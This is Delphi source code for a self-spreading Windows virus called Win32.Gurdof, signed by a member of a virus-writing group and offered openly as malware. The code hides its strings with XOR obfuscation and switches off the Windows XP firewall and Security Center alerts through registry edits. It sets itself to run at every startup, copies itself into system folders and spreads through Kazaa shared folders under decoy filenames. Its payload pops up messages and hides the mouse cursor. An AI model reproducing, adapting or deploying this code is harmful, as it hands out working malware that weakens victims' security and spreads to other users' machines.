program gurdof;

//{$APPTYPE CONSOLE}

{ ///////////////////////////////////////////////////////////////////////
                           Win32.Gurdof by Hutley/RRLF
 This is my first virus in RRLF (Ready Rangers Liberation Front) Team.
////////////////////////////////////////////////////////////////////////

  What Win32.Gurdof doing:
        + Fuck the WinXP Firewall
        + Simple Function that Decode the Strings
        + Disable Notifications of Security Center
        + Infect Kazaa Program
        + Payload: Sort Randomly a Number Until 20, if the number be < 14
                    then show messages and hide the mouse icon.

  Comment: IS VERY SIMPLE I KNOW. I TERMINETED IT BECAUSE I GO
             START THE STUDY OF ASSEMBLY LANGUAGE.
           WAIT, COMMING SOON NEWS VIRUSES IN ASM32.

           Hutley / rRlf - The Psychodelic Virus Writer
           24 - Feb - 2006 -*- BRAZIL!
}

uses
 Windows, Registry, SysUtils, Dialogs;

const
 vir_name: string = 'Win32.Gurdof';
 made_by: string = 'Hutley of rRlf VX Team';
 
var
 ExeName: array[0..260] of Char;
 start_: TRegistry;
 
function code_(text: string; chave: integer): string;
var lp1, p: integer;
 fuck: string;
begin
 lp1 := strlen(pchar(text));
 for p := 1 to lp1 do begin
  fuck := fuck + chr(ord(text[p]) xor chave)
 end;
 code_ := fuck
end;

function WinDir: string;
begin
 SetLength(Result, MAX_PATH);
 Windows.GetWindowsDirectory(PChar(Result), MAX_PATH);
 Result := string(PChar(Result)) + '\';
end;

function SysDir: string;
begin
 SetLength(Result, MAX_PATH);
 if GetSystemDirectory(PChar(Result), MAX_PATH) > 0 then
  Result := string(PChar(Result)) + '\'
 else
  Result := '';
end;

procedure fuck_xp_firewall;
var ffw: TRegistry;
begin
 ffw := TRegistry.Create;
 ffw.RootKey := HKEY_LOCAL_MACHINE;
 // Part 1
 ffw.OpenKey(code_('Q[QVGO^AwppglvAmlvpmnQgv^Qgptkagq^QjcpgfCaagqq^Rcpcogvgpq^DkpgucnnRmnka{^FmocklRpmdkng', 2), FALSE);
 ffw.WriteFloat(code_('GjpbaofMlwjej`bwjlmp', 3), 1);
 ffw.WriteFloat(code_('AjefhaBmvasehh', 4), 0);
 ffw.WriteFloat(code_('@kJkpEhhksA|gatpmkjw', 5), 0);
 ffw.CloseKey;
 // Part 2
 ffw.OpenKey(code_('U_URCKZEsttchrEihrtijUcrZUctpoecuZUngtcbGeecuuZVgtgkcrctuZ@otcqgjjVijoeZUrghbgtbVti`ojc', 6), false);
 ffw.WriteFloat(code_('La{ijdmFg|anaki|agf{', 8), 1);
 ffw.WriteFloat(code_('OdkhfoLcxo}kff', 10), 0);
 ffw.WriteFloat(code_('OdEdJggd|Nshn{bdex', 11), 0);
 ffw.CloseKey;
 // Part 3
 ffw.OpenKey(code_('Xdm|jynWFbhydxdmWXnh~ybr+Hneny', 11), false);
 ffw.WriteFloat(code_('Kd~c\cxyNcykhfoDe~cls', 10), 1);
 ffw.WriteFloat(code_('O`{l~heeM`zhkelGf}`op', 9), 1);
 ffw.WriteFloat(code_('If|a^az}{G~mzzalm', 8), 1);
 ffw.WriteFloat(code_('AnubpfkkHqbuuncb', 7), 1);
 ffw.CloseKey;
 // End
 ffw.Free;
end;

procedure infect_p2p_kazaa;
var kazaa: TRegistry;
begin
 kazaa := TRegistry.Create;
 kazaa.RootKey := HKEY_CURRENT_USER;
 if kazaa.OpenKey(code_('Ui`rqgtcZMG\GGZJiegjEihrchrZ', 6), false) then
 begin
  kazaa.WriteFloat(code_('Alvdgi`Vmdwlkb', 5), 0);

  kazaa.WriteString(code_('@mv4', 4), WinDir);
  kazaa.WriteString(code_('@mv5', 4), WinDir + code_('Pkbqf', 3));

  GetModuleFileNameA(0, ExeName, SizeOf(ExeName));

  CreateDir(WinDir + code_('Jqxk|E', 25));

  CopyFile(ExeName, PChar(WinDir + code_('G|ufqHg}g`qfKraw}zsK}zKvx{zpq:~ds:qlq', 20)), True);
  CopyFile(ExeName, PChar(WinDir + code_('F}tgpIwtwlJf|apgJ|{Jwpq;er;pmp', 21)), True);
  CopyFile(ExeName, PChar(WinDir + code_('DverKgrsxHp~e{?&"nx>Hqbt|~yp9}gp9ror', 23)), True);
  CopyFile(ExeName, PChar(WinDir + code_('Kpyj}DuaG{wmkqvGqvG~yuqtaG`@`6rh6}`}', 24)), True);
  CopyFile(ExeName, PChar(WinDir + code_('Ir{hFvixs{tiE|oyqE|oyqE|oyqE|oyq4pj}4b', 26)), True);
 end;
 kazaa.Free;
end;

function show_cursor(const Show: boolean): boolean;
var
 I: integer;
begin
 I := ShowCursor(LongBool(true));
 if Show then begin
  Result := I >= 0;
  while I < 0 do begin
   Result := ShowCursor(LongBool(true)) >= 0;
   Inc(I);
  end;
 end else begin
  Result := I < 0;
  while I >= 0 do begin
   Result := ShowCursor(LongBool(false)) < 0;
   Dec(I);
  end;
 end;
end;

procedure my_payload;
var i: integer;
begin
 Randomize;
 if Random(50) <= 14 then
 begin
  for i := 1 to 10 do
  begin
   ShowMessagePos(code_('===<[INXSZ<sKrF<eSi<===', 28)
    + #13#13 + code_('=============Uhiqxd=2=OOQ[', 29), Random(800), Random(600));
   show_cursor(false);
  end;
 end;
end;

begin
 // Install In Registry - Auto Start
 start_ := TRegistry.Create;
 start_.RootKey := HKEY_LOCAL_MACHINE;
 start_.OpenKey(code_(']ahzyo|kRCgm|a}ahzRYg`jay}RM{||k`zXk|}ga`R\{`', 14), true);
 start_.WriteString('Gurdof', code_('D[I[[[ MPM', 40));
 start_.Free;
 // Module of Current .Exe
 GetModuleFileNameA(0, ExeName, SizeOf(ExeName));
 // System Dir - 2 Copies of Virus
 CopyFile(ExeName, PChar(SysDir + code_('D[I[[[ MPM', 40)), true);
 CopyFile(ExeName, PChar(SysDir + code_('IEGKDN ORO', 42)), true);
 // Win Dir - 2 Copies of Virus
 CopyFile(ExeName, PChar(WinDir + code_('[EBHC[_ ITI', 44)), true);
 CopyFile(ExeName, PChar(WinDir + code_(']W]ZKC', 46)), true);
 // Desable the WinXP Firewall and Security Center
 fuck_xp_firewall;
 // Spread by Kazaa
 infect_p2p_kazaa;
 // A Simple Payload
 my_payload;
end.

